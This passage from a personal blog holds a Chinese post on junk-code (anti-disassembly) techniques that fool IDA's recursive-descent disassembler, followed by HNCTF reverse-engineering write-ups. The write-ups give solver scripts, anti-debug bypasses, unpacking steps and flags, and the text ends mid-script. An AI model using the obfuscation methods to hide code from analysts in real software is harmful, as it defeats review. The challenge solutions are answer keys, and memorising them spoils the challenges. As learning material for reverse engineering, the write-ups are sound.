    <content><![CDATA[<h6 id="大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，以后IDA抽风的时候也更清楚点为啥"><a href="#大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，以后IDA抽风的时候也更清楚点为啥" class="headerlink" title="大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，以后IDA抽风的时候也更清楚点为啥"></a>大概是二三月份遇到了一个题出了一个有点意思的花，想着可以看看，对应这种花写了个简单的源码随机加花器。不是什么高深的技术，但是也顺便把IDA这类线性扫描反汇编和递归下降反汇编弄清楚点，<del>以后IDA抽风的时候也更清楚点为啥</del></h6><span id="more"></span>

<h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><h6 id="来源于-IDAPro权威指南"><a href="#来源于-IDAPro权威指南" class="headerlink" title="来源于 IDAPro权威指南"></a>来源于 IDAPro权威指南</h6><h5>
<details> <summary>线性扫描反汇编</summary>

<p><img src="/2023/07/18/junk-code-demo/image-20230718011401924.png" alt="image-20230718011401924"></p>
</details>
</h5>

<h5>
<details> <summary>递归下降反汇编</summary>

<p><img src="/2023/07/18/junk-code-demo/image-20230718011457626.png" alt="image-20230718011457626"></p>
<p><img src="/2023/07/18/junk-code-demo/image-20230718011531171.png" alt="image-20230718011531171"></p>
<p><img src="/2023/07/18/junk-code-demo/image-20230718011544013.png" alt="image-20230718011544013"></p>
</details>
</h5>

<h5 id="这里主要看递归下降反汇编方式"><a href="#这里主要看递归下降反汇编方式" class="headerlink" title="这里主要看递归下降反汇编方式"></a>这里主要看递归下降反汇编方式</h5><h5 id="首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk-instructions如-jz-jnz-或者永真-x2F-假条件-jz-x2F-jnz类型（注意：后者在构造时需要考虑编译器优化问题）"><a href="#首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk-instructions如-jz-jnz-或者永真-x2F-假条件-jz-x2F-jnz类型（注意：后者在构造时需要考虑编译器优化问题）" class="headerlink" title="首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk instructions如(jz+jnz)或者永真&#x2F;假条件+jz&#x2F;jnz类型（注意：后者在构造时需要考虑编译器优化问题）"></a>首先明确IDAPro的反汇编均为静态进行。根据条件分支指令可以构造入门的junk instructions如(jz+jnz)或者永真&#x2F;假条件+jz&#x2F;jnz类型（注意：后者在构造时需要考虑编译器优化问题）</h5><h5 id="实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk-code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）"><a href="#实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk-code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）" class="headerlink" title="实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）"></a>实际上，根据上面这个跳转问题，就可以构造一种花，在虚假的控制流中间加入诸如破坏栈帧的junk code，导致反编译失败。不过实践应该是没什么用的，毕竟去虚假控制流的最常见思路就是模拟动态执行，顺带就把花拿下了：）</h5><h5 id="如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk-code，使得反汇编失效"><a href="#如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk-code，使得反汇编失效" class="headerlink" title="如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk code，使得反汇编失效"></a>如果能理解这个最基本的例子原理，大概可以找到一种构造反汇编的通式：<code>用构造永真条件跳转逻辑，在产生的虚假的控制流中塞入junk code，使得反汇编失效</code></h5><h5 id="然后，配合一些小小的汇编知识，就可以产生奇妙的效果"><a href="#然后，配合一些小小的汇编知识，就可以产生奇妙的效果" class="headerlink" title="然后，配合一些小小的汇编知识，就可以产生奇妙的效果"></a>然后，配合一些小小的汇编知识，就可以产生奇妙的效果</h5><h5 id="例如，call指令正常情况下不会指向其他call-retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时-不维护条件寄存器-，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（-可能有点抽象，这里写了个小demo-junkCode-x2F-README-md-at-main-·-DeMoYao100-x2F-junkCode-github-com"><a href="#例如，call指令正常情况下不会指向其他call-retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时-不维护条件寄存器-，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（-可能有点抽象，这里写了个小demo-junkCode-x2F-README-md-at-main-·-DeMoYao100-x2F-junkCode-github-com" class="headerlink" title="例如，call指令正常情况下不会指向其他call retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时__不维护条件寄存器__，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（[可能有点抽象，这里写了个小demo](junkCode&#x2F;README.md at main · DeMoYao100&#x2F;junkCode (github.com))"></a>例如，call指令正常情况下不会指向其他call retn间的地址，但通过asm汇编内联，可以让call指向一个最近的相对地址，同时__不维护条件寄存器__，通过该条件寄存器控制永真逻辑。当调用retn的时候返回call，下面的条件寄存器会重复修改。中间的代码在IDA优化过程中是假逻辑，但构造运行两次后变为永真。（[可能有点抽象，这里写了个小demo](<a href="https://github.com/DeMoYao100/junkCode">junkCode&#x2F;README.md at main · DeMoYao100&#x2F;junkCode (github.com)</a>)</h5><h5 id="其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行"><a href="#其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行" class="headerlink" title="其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行"></a>其实基本上看懂这个demo，就能搞明白上面这个通式了，这里修改寄存器、或者其它构造虚假控制流的方法可就多种多样了（疑似是之前看过构造rop链劫持控制流的题，无心之举导致的反编译失效）也没必要深究，遇到之后再分析就行</h5><h5 id="然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）"><a href="#然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）" class="headerlink" title="然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）"></a>然后是函数指针篡改，感觉一出现ida很容易抽风，基本上就是动调的时候修就行（除非恶意构造）</h5><h6 id="最后立个flag，有空把IDA反编译也写一篇ida反编译是真喜欢抽风啊。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助"><a href="#最后立个flag，有空把IDA反编译也写一篇ida反编译是真喜欢抽风啊。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助" class="headerlink" title="最后立个flag，有空把IDA反编译也写一篇ida反编译是真喜欢抽风啊。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助"></a>最后立个flag，有空把IDA反编译也写一篇<del>ida反编译是真喜欢抽风啊</del>。虽然这俩并不是啥必要学的东西，也不难，但是搞清楚一点确确实实在分析很多垃圾二进制汇编的时候有帮助</h6>]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>hnctfRe</title>
    <url>/2022/11/02/hnctfRe/</url>
    <content><![CDATA[<h6 id="Some-reverse-questions-I-didn’t-have-time-to-solve-Or-didn’t-solve-out…"><a href="#Some-reverse-questions-I-didn’t-have-time-to-solve-Or-didn’t-solve-out…" class="headerlink" title="Some reverse questions I didn’t have time to solve. (Or didn’t solve out…)"></a>Some reverse questions I didn’t have time to solve. (Or didn’t solve out…)</h6><span id="more"></span>
<h3 id="Help-Me"><a href="#Help-Me" class="headerlink" title="Help_Me!"></a>Help_Me!</h3><h5 id="My-exp"><a href="#My-exp" class="headerlink" title="My exp:"></a>My exp:</h5><pre><code>#include&lt;bits/stdc++.h&gt;
using namespace std;
int v12[1000]=&#123;0&#125;;
int v13[1000]=&#123;0&#125;;
long long maxn;
int v[1000];
void dfs(int cns,int n,int num,long long sum)&#123;
    if (num&gt;200 || n==20)
    &#123;
        if (n!=20)
        sum-=v12[n];
        cns--;
        if (sum&gt;=maxn)&#123;
            maxn=sum;
            cout&lt;&lt;&quot;sum  =  &quot;&lt;&lt;sum&lt;&lt;&quot;    :  &quot;&lt;&lt;&quot;cns=&quot;&lt;&lt;cns&lt;&lt;&quot;   &quot;;
            for (int i=0;i&lt;cns;i++)&#123;
                cout&lt;&lt;v[i]&lt;&lt;&quot; &quot;;
            &#125;
            cout&lt;&lt;endl;
        &#125;
        return ;
    &#125;
    
    for (int i=n+1;i&lt;=20;i++)&#123;
        v[cns]=i;
        
        dfs(cns+1,i,num+v13[i],sum+v12[i]);
    &#125;
&#125;


int main()&#123;
    
    v12[0] = 26;
    v12[1] = 59;
    v12[2] = 30;
    v12[3] = 19;
    v12[4] = 66;
    v12[5] = 85;
    v12[6] = 94;
    v12[7] = 8;
    v12[8] = 3;
    v12[9] = 44;
    v12[20] = 1000;
    v12[10] = 5;
    v12[11] = 1;
    v12[12] = 41;
    v12[13] = 82;
    v12[14] = 76;
    v12[15] = 1;
    v12[16] = 12;
    v12[17] = 81;
    v12[18] = 73;
    v12[19] = 32;
    v12[20]=1;
    v13[0] = 71;
    v13[1] = 34;
    v13[20] = 1000;
    v13[2] = 82;
    v13[3] = 23;
    v13[4] = 1;
    v13[5] = 88;
    v13[6] = 12;
    v13[7] = 57;
    v13[8] = 10;
    v13[9] = 68;
    v13[10] = 5;
    v13[11] = 33;
    v13[12] = 37;
    v13[13] = 69;
    v13[14] = 98;
    v13[15] = 24;
    v13[16] = 26;
    v13[17] = 83;
    v13[18] = 16;
    v13[19] = 26;
    v13[20]=1;
    maxn=0;
    dfs(0,-1,0,1);
&#125;
</code></pre>
<h5 id="Official-exp"><a href="#Official-exp" class="headerlink" title="Official exp:"></a>Official exp:</h5><pre><code>#include &quot;iostream&quot;
#include &quot;stdio.h&quot;
using namespace std;
int val[50]=&#123;26, 59, 30, 19, 66, 85, 94, 8, 3, 44, 5, 1, 41, 82, 76, 1,    12,    81,    73,    32&#125;,
w[50]=&#123;71, 34, 82, 23, 1,88,12,57, 10, 68, 5, 33,    37,    69,    98,    24, 26,    83, 16, 26&#125;;
int dp[21][301];
int main()
&#123;
    int t=200;
    int m = 20;
    for(int i=1;i&lt;=m;i++) 
        for(int j=t;j&gt;=0;j--)  
    &#123;
        if(j&gt;=w[i])//容量可以放 
        &#123;
            int tmp;
            dp[i][j]=max(dp[i-1][j-w[i]]+val[i],dp[i-1][j]);
        &#125;  
        else
        &#123;
            dp[i][j]=dp[i-1][j];
        &#125;              
    &#125;
    //dp[i][j] = max(dp[i-1][j-w[i]]+val[i],dp[i-1][j]);
    int x = 20;
    int y = 200;
    while(x!=0)
    &#123;
        if(dp[x-1][y-w[x]]+val[x] &gt; dp[x-1][y])        
        &#123;
            printf(&quot;%d,&quot;,x); 
            y-=w[x];
        &#125;
        x-=1;
    &#125;
    return 0;
&#125;
</code></pre>
<p>A 0-1 bag problem. And notice that you should <c style="color: #FF0000;">ADD</c> v12, not MULTIPLY, like in the ida……</p>
<h3 id="CM2"><a href="#CM2" class="headerlink" title="CM2"></a>CM2</h3><h6 id="Don’t-understand-how-to-debug-to-find-the-place…-Though-by-guessing-I-work-it-out-anyway"><a href="#Don’t-understand-how-to-debug-to-find-the-place…-Though-by-guessing-I-work-it-out-anyway" class="headerlink" title="Don’t understand how to debug to find the place… Though by guessing I work it out anyway."></a>Don’t understand how to debug to find the place… Though by guessing I work it out anyway.</h6><h5 id="Officail-wp"><a href="#Officail-wp" class="headerlink" title="Officail wp:"></a>Officail wp:</h5><p><img src="/2022/11/02/hnctfRe/cm2.png" alt="cm2"></p>
<h3 id="Try2debugPlusPlus"><a href="#Try2debugPlusPlus" class="headerlink" title="Try2debugPlusPlus"></a>Try2debugPlusPlus</h3><p>Nop the <code>IsDebuggerPresent()</code>(noticed that there are two of them) and get the key(remember to set breakpoint after <code>printf()</code>):</p>
<p><img src="/2022/11/02/hnctfRe/debug2_1.png" alt="debug2_1"></p>
<p>Though is easy for us to decrypt the tea_encrypt, question setter seems to have forgotten something…</p>
<p><img src="/2022/11/02/hnctfRe/debug2_2.png" alt="debug2_2"></p>
<h3 id="What-1in-D11"><a href="#What-1in-D11" class="headerlink" title="What_1in_D11"></a>What_1in_D11</h3><p>Repair the upx’s features(easy in this problem, to study more you can refer to <a href="https://www.52pojie.cn/thread-326995-1-1.html">this blog</a>)</p>
<p>And <code>upx -d</code> to unpacked the .dll, check it in ida, we got:</p>
<p><img src="/2022/11/02/hnctfRe/dll_1.png" alt="dll"></p>
<h5 id="Official-writeup"><a href="#Official-writeup" class="headerlink" title="Official writeup:"></a>Official writeup:</h5><h6 id="A-btea-encrypt-which-I-am-not-fimilar-with-yet-Shall-get-more-study-about-encryption-and-decryption-later"><a href="#A-btea-encrypt-which-I-am-not-fimilar-with-yet-Shall-get-more-study-about-encryption-and-decryption-later" class="headerlink" title="(A btea encrypt, which I am not fimilar with yet. Shall get more study about encryption and decryption later.)"></a>(A btea encrypt, which I am not fimilar with yet. Shall get more study about encryption and decryption later.)</h6><pre><code>#include &lt;stdio.h&gt;  
#include &lt;stdint.h&gt;  
#define DELTA 0x9e3779b9  
#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  
void btea(uint32_t *v, int n, uint32_t const key[4])  
&#123;  
    uint32_t y, z, sum;  
    unsigned p, rounds, e;  
    if (n &gt; 1)            /* Coding Part */  
    &#123;  
        rounds = 6 + 52/n;  
        sum = 0;  
        z = v[n-1];  
        do  
        &#123;  
            sum += DELTA;  
            e = (sum &gt;&gt; 2) &amp; 3;  
            for (p=0; p&lt;n-1; p++)  
            &#123;  
                y = v[p+1];  
                z = v[p] += MX;  
            &#125;  
            y = v[0];  
            z = v[n-1] += MX;  
        &#125;  
        while (--rounds);  
    &#125;  
    else if (n &lt; -1)      /* Decoding Part */  
    &#123;  
        n = -n;  
        rounds = 6 + 52/n;  
        sum = rounds*DELTA;  
        y = v[0];  
        do  
        &#123;  
            e = (sum &gt;&gt; 2) &amp; 3;  
            for (p=n-1; p&gt;0; p--)  
            &#123;  
                z = v[p-1];  
                y = v[p] -= MX;  
            &#125;  
            z = v[n-1];  
            y = v[0] -= MX;  
            sum -= DELTA;  
        &#125;  
        while (--rounds);  
    &#125;  
&#125;  
int main()  
&#123;  
    unsigned int enc[8]=&#123;0x22a577c1,0x1c12c03,0xc74c3ebd,0xa9d03c85,0xadb8ffb3&#125;;
    uint32_t const k[4]= &#123;55,66,77,88&#125;;  
    int n= 5; //n的绝对值表示v的长度，取正表示加密，取负表示解密  
    // v为要加密的数据是两个32位无符号整数  
    // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位  
    btea(enc, -n, k);  
    for(int i=0;i&lt;5;i++)
    &#123;
            printf(&quot;%x&quot;,enc[i]);
        &#125;
    return 0;  
&#125;  
</code></pre>
<h3 id="Mazes"><a href="#Mazes" class="headerlink" title="Mazes"></a>Mazes</h3><h6 id="A-bit-complex-wait-until-later…"><a href="#A-bit-complex-wait-until-later…" class="headerlink" title="A bit complex, wait until later…"></a>A bit complex, wait until later…</h6><h3 id="stub"><a href="#stub" class="headerlink" title="stub"></a>stub</h3><h6 id="Never-seen-before-later…"><a href="#Never-seen-before-later…" class="headerlink" title="Never seen before, later…"></a>Never seen before, later…</h6><h3 id="ez-maze"><a href="#ez-maze" class="headerlink" title="ez_maze"></a>ez_maze</h3><p>We get a .exe file, from its’ icon we know that we should uncompile it to .pyc with <code>pyinstxtractor</code></p>
<p><img src="/2022/11/02/hnctfRe/ez_maze_1.png" alt="ez_maze"></p>
<p>Then, we got a package <code>_extracted</code>:</p>
<h6 id="complex-it-is…"><a href="#complex-it-is…" class="headerlink" title="complex it is…"></a>complex it is…</h6><p><img src="/2022/11/02/hnctfRe/extracted.png" alt="extracted"></p>
<p>Find a file named <code>maze</code> (without a suffix one!) Change its suffix into <code>.pyc</code> and Try <code>compyle6 -o maze.py maze.pyc</code>, it went wrong:</p>
<p><img src="/2022/11/02/hnctfRe/uncompyle6.png" alt="compyle6"></p>
<p>That’s when you find out that pyinstxtractor didn’t fix your .pyc file’s magic number.</p>
<p><img src="/2022/11/02/hnctfRe/cmakeInstall.png" alt="cmake"></p>
<p><a href="https://www.jb51.net/article/231188.htm">The link problem setter gives you</a>, which does no help at all…The <code>magic number</code> of the file <code>struct</code> is destroy as well…</p>
<p><img src="/2022/11/02/hnctfRe/magicNumber_1.jpg" alt="magicNumber_1"></p>
<p>I been trying tools like <code>uncompyle6</code>(which does not support python 3.10, and install python 3.9 does not help at all. Later I should look into this problem and try to solved it…)  and <code>pycdc</code>(which is said to support high edition, but can not identify the magic number as well) However, when I tried to add some magic number from other python edition(Python 3.8b2, if I remember it right), and put it in an <a href="https://tool.lu/pyc/">online uncompiler</a>. It just worked…</p>
<blockquote>
<p><a href="https://www.cnblogs.com/Here-is-SG/p/15885799.html">a blog from my classmate that may help(though I do not really think so…)</a></p>
</blockquote>
<h5 id="some-magic-number"><a href="#some-magic-number" class="headerlink" title="some magic number:"></a>some magic number:</h5><pre><code>enum PycMagic &#123;
    MAGIC_1_0 = 0x00999902,
    MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */
    MAGIC_1_3 = 0x0A0D2E89,
    MAGIC_1_4 = 0x0A0D1704,
    MAGIC_1_5 = 0x0A0D4E99,
    MAGIC_1_6 = 0x0A0DC4FC,

    MAGIC_2_0 = 0x0A0DC687,
    MAGIC_2_1 = 0x0A0DEB2A,
    MAGIC_2_2 = 0x0A0DED2D,
    MAGIC_2_3 = 0x0A0DF23B,
    MAGIC_2_4 = 0x0A0DF26D,
    MAGIC_2_5 = 0x0A0DF2B3,
    MAGIC_2_6 = 0x0A0DF2D1,
    MAGIC_2_7 = 0x0A0DF303,

    MAGIC_3_0 = 0x0A0D0C3A,
    MAGIC_3_1 = 0x0A0D0C4E,
    MAGIC_3_2 = 0x0A0D0C6C,
    MAGIC_3_3 = 0x0A0D0C9E,
    MAGIC_3_4 = 0x0A0D0CEE,
    MAGIC_3_5 = 0x0A0D0D16,
    MAGIC_3_5_3 = 0x0A0D0D17,
    MAGIC_3_6 = 0x0A0D0D33,
    MAGIC_3_7 = 0x0A0D0D42,
    MAGIC_3_8 = 0x0A0D0D55,
    MAGIC_3_9 = 0x0A0D0D61,
&#125;;
</code></pre>
<p>uncompyle:(to long the maze is, I didn’t put it here)</p>
<p><img src="/2022/11/02/hnctfRe/uncompyle.jpg" alt="uncompyle"></p>
<p>Dfs script(From official wp):</p>
<pre><code>map1=[...]
map2 =  [[0 for i in range(len(map1))] for i in range(len(map1)) ]
flag=&quot;&quot;
def DFS(x,y):
    global flag
    if x == len(map1) - 2 and y == len(map1) - 2: #判断边界
        print(flag)
    if map1[x+1][y] == 0 and map2[x+1][y] == 0:
        map2[x][y] = 1
        flag += &#39;s&#39;
        DFS(x+1,y)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x-1][y] == 0 and map2[x-1][y] == 0:
        map2[x][y] = 1
        flag += &#39;w&#39;
        DFS(x-1,y)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x][y+1] == 0 and map2[x][y+1] == 0:
        map2[x][y] = 1
        flag += &#39;d&#39;
        DFS(x,y+1)
        flag = flag[:-1]
        map2[x][y] = 0
    if map1[x][y-1] == 0 and map2[x][y-1] == 0:
        map2[x][y] = 1
        flag += &#39;a&#39;
        DFS(x,y-1)
        flag = flag[:-1]
        map2[x][y] = 0
y=1
x=1
DFS(x,y)
</code></pre>
<h3 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h3><p>Gets a .exe file, check whether shell exists.</p>
<p><img src="/2022/11/02/hnctfRe/findItShell.png" alt="shell"></p>
<h5 id="Open-it-with-ida"><a href="#Open-it-with-ida" class="headerlink" title="Open it with ida."></a>Open it with ida.</h5><p><img src="/2022/11/02/hnctfRe/finditIda_1.png" alt="ida1"><br><img src="/2022/11/02/hnctfRe/finditIda_2.png" alt="ida2"><br><img src="/2022/11/02/hnctfRe/finditIda_3.png" alt="ida3"></p>
<p>A complex encryption. The key and the flag both needs to be brute forces out. I shall do a emersion later…</p>
<h5 id="Official-wp"><a href="#Official-wp" class="headerlink" title="Official wp:"></a>Official wp:</h5><pre><code>mid=[32,59,121,60,125,45,32,17,38,0,43,45,48,48,28,42,11,20,49,100,63,119,103,53,173,46,136,158,49,78,78,176]
enc=[29,70,92,84,87,19,61,43,62,60,29,9,18,63,6,6,42,14,124,110,109,60,105,191,7,162,64,104,92,61,223,179]
flag=[0]*32
flag[31]=179
flag[30]=223
print(flag)
#th1s_3ncryt_is_s0_e@sy!1
key = [ord(i) for i in &quot;HN_CTF&quot;]
def decrypt(arr):
    for i in range(0,len(arr)//4):
        tmp = arr[4*i:4*i+4]
        st = &quot;&quot;
        st+=chr(tmp[3]^key[i%6])
        st+=chr(tmp[0]^key[i%6])
        st+=chr(tmp[2]^key[i%6])
        st+=chr(tmp[1]^key[i%6])
        print(st,end=&#39;&#39;)
    print()   
    pass
def dfs(deep):
    global flag
    if(deep==0):
        decrypt(flag)
    else:
        for i in range(0,0xff):
            if( enc[deep-1] == (0x12+deep-1)^ ((i+12)%24 )^ i ^ flag[deep]):
                flag[deep-1] = i
                dfs(deep-1)
dfs(31)
</code></pre>
<h3 id="flower"><a href="#flower" class="headerlink" title="flower"></a>flower</h3><p>From ida, there are a lot of junkcodes inside, and we have to patch them before I can analyze the code.</p>
<p><a href="https://www.52pojie.cn/thread-1512089-1-1.html">junkcode</a></p>
<h5 id="Some-script-to-nop-the-junkcodes"><a href="#Some-script-to-nop-the-junkcodes" class="headerlink" title="Some script to nop the junkcodes:"></a>Some script to nop the junkcodes:</h5><p><img src="/2022/11/02/hnctfRe/flower_junkcode_1.png" alt="junkcode1"></p>
<h5 id="scripts1"><a href="#scripts1" class="headerlink" title="scripts1:"></a>scripts1:</h5><pre><code>import idc
import idautils
start =0x00401000
end = 0x00401401
bad=[0x75,0x02,0x74,0x01,0xc7]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0x75:
        flag=1
        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
<h5 id="scripts2"><a href="#scripts2" class="headerlink" title="scripts2:"></a>scripts2:</h5><p><img src="/2022/11/02/hnctfRe/flower_junkcode_2.png" alt="junkcode2"></p>
<pre><code>import idc
import idautils
start =0x00401000
end = 0x00401401
bad=[0xe8,0x01,0x00,0x00,0x00,0xe8,0x36,0x83,0x04,0x24,0x08,0xc3,0xe8]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0xe8:
        flag=1
        for j in range(len(bad)):
            if(idc.get_wide_byte(i+j)!= bad[j]):
                flag=0
                break
        if flag==1:
            for j in range(len(bad)):
                patch_byte(i+j,0x90)
                print(&quot;success&quot;)
</code></pre>
<h6 id="Some-interlude"><a href="#Some-interlude" class="headerlink" title="Some interlude:"></a>Some interlude:</h6><p><img src="/2022/11/02/hnctfRe/flowerPDF.png" alt="PDF"></p>
<h5 id="Anyway-the-uncompilation-shall-look-like-this"><a href="#Anyway-the-uncompilation-shall-look-like-this" class="headerlink" title="Anyway, the uncompilation shall look like this:"></a>Anyway, the uncompilation shall look like this:</h5><p><img src="/2022/11/02/hnctfRe/flowerIda.png" alt="ida"></p>
<h5 id="The-encrypt-function"><a href="#The-encrypt-function" class="headerlink" title="The encrypt function:"></a>The encrypt function:</h5><p><img src="/2022/11/02/hnctfRe/flowerEncrypt.png" alt="encrypt"></p>
<h5 id="Now-we-get-the-encryption-we-can-know-that-it-is-a-RC4-encryption-and-here-comes-the-official-exp"><a href="#Now-we-get-the-encryption-we-can-know-that-it-is-a-RC4-encryption-and-here-comes-the-official-exp" class="headerlink" title="Now we get the encryption, we can know that it is a RC4- encryption, and here comes the official exp:"></a>Now we get the encryption, we can know that it is a RC4- encryption, and here comes the official exp:</h5><pre><code>#include &lt;iostream&gt;
using namespace std;
unsigned int ar[40] = &#123; 0x4d,0xffffffe6,0x49,0xffffff95,0x3,0x2d,0x2b,0xffffffba,0xffffffea,0x6d,0xffffffff,0x59,0x70,0x0,0x1b,0xffffffa9,0x2c,0xffffffb0,0x32,0xffffff98,0x6f,0xffffff8c,0x56,0xffffffa2,0x4c,0x79,0x7f &#125;;
// c[i]_ = c[i]^c[(i+1)%27]
// c[26]_ = c[26]^c_[0]
unsigned char st[16] = &quot;Hello_Ctfers!!!&quot;;
void O0oo00OOo00o0(unsigned char *m, int mlen, int keylen) &#123;
        unsigned char s[256];
        unsigned char t[256];
        int i;
        for ( i = 0; i &lt; 256; i++) &#123; //初始化s和t向量 
                s[i] = i;
                t[i] = st[i%keylen];
        &#125;        
        int j = 0;
        for ( i = 0; i &lt; 256; i++) &#123;
                j = (j + s[i] + t[i]) % 256;
                swap(s[i],s[j]);
                //根据t向量打乱s盒 
        &#125;
        unsigned char k[64];//保存秘钥流，或者直接进行异或 
        i = 0; j = 0; 
        int tmp;
        int index ;
        for ( index = 0; index &lt; mlen; index++) &#123;   //生成与明文长度一致的秘钥流 
                i = (i + 3) % 256;
                j = (j + s[i]+1) % 256;
                swap(s[i],s[j]); 
                tmp = (s[i] + s[j]) % 256;
                k[index] = s[tmp];//保存秘钥 
        &#125;
        for (i = 0; i &lt; mlen; i++)
        &#123;
                m[i] = m[i] ^ k[i];//主要进行了一步异或，加密的逆过程就是解密 
        &#125;
&#125;
int main()
&#123;
        char c[27]=&#123;0x4d,0xffffffe6,0x49,0xffffff95,0x3,0x2d,0x2b,0xffffffba,0xffffffea,0x6d,0xffffffff,0x59,0x70,0x0,0x1b,0xffffffa9,0x2c,0xffffffb0,0x32,0xffffff98,0x6f,0xffffff8c,0x56,0xffffffa2,0x4c,0x79,0x7f &#125;;
        int i;
        for(i=26;i&gt;=0;i--)
        &#123;
                c[i] = c[(i+1)%27]^c[i];
        &#125;
        for(i=0;i&lt;27;i++)
        &#123;
                printf(&quot;0x%x,&quot;,c[i]) ;
        &#125;
        O0oo00OOo00o0((unsigned char *)c,27,16);
        printf(&quot;\n&quot;);
                for(i=0;i&lt;27;i++)
        &#123;
                printf(&quot;%c&quot;,c[i]&amp;0xff) ;
        &#125;
&#125;
</code></pre>
<p>It base on static crack here, but a bro told me that since there is only <c style="color: #FF0000;">ONE</c> <code>XOR</code> that really do something to your flag, you can dynamic debug to get the array <code>v4</code>. (in the upper encryption photograth) Which is really genius because whether you know how to decrypt rc4 or not you can solve this problem and it do save you tons of work!</p>
<h6 id="Just-input-a-series-of-‘1’-and-look-into-the-ECX-register"><a href="#Just-input-a-series-of-‘1’-and-look-into-the-ECX-register" class="headerlink" title="Just input a series of ‘1’ and look into the ECX register!"></a>Just input a series of ‘1’ and look into the <code>ECX</code> register!</h6><p><img src="/2022/11/02/hnctfRe/dynamic_1.png" alt="dynamic_1"><br><img src="/2022/11/02/hnctfRe/dynamic_2.png" alt="dynamic_2"><br><img src="/2022/11/02/hnctfRe/dynamic_3.png" alt="dynamic_3"><br><img src="/2022/11/02/hnctfRe/dynamic_4.png" alt="dynamic_4"><br><img src="/2022/11/02/hnctfRe/dynamic_5.png" alt="dynamic_5"></p>
<h5 id="And-so-on…"><a href="#And-so-on…" class="headerlink" title="And so on…"></a>And so on…</h5><pre><code>###### Two thinkings(should be tried out later):
###### Can `angr` solve `rc4` immediately?
###### Can I add a `hook` so it prints the `ECX` rightaway and I don&#39;t need to check it once and once again?
######                                                                                          --2022.11.4
</code></pre>
<p>From here, the last few problems are quite hard…</p>
<h3 id="MAZE"><a href="#MAZE" class="headerlink" title="MAZE"></a>MAZE</h3><p>We found thounds of junkcodes here, and we nop them:</p>
<pre><code>import idc
import idautils
start =0x00140001000
end = 0x00140CEF1F0
bad=[0x50,0x48,0x0f,0xc7,0xf0,0x58]

for i in range(start,end):
    if idc.get_wide_byte(i) == 0x50:
        flag=1
